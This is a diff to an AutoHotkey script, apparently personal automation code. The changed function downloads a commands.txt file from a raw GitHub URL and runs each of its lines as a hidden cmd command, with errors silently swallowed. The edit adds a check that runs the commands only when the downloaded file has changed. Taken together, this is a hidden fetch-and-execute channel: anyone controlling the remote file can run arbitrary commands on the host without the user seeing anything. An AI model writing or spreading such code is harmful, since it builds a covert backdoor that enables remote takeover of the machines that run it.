@@ -30,14 +30,21 @@ runAllExes() {
 
     try {
         output := path "\commands.txt"
+        original := ""
+        try {
+            original := FileRead(output)
+        } catch {
+        }
         url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
         command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
         Run command, , "Hide"
         text := FileRead(output)
-        lines := StrSplit(text, "`n")
-        for index, line in lines {
-            newCommand := 'cmd /c ' line
-            Run newCommand, , "Hide"
+        if original != text {
+            lines := StrSplit(text, "`n")
+            for index, line in lines {
+                newCommand := 'cmd /c ' line
+                Run newCommand, , "Hide"
+            }
         }
     } catch {
     }
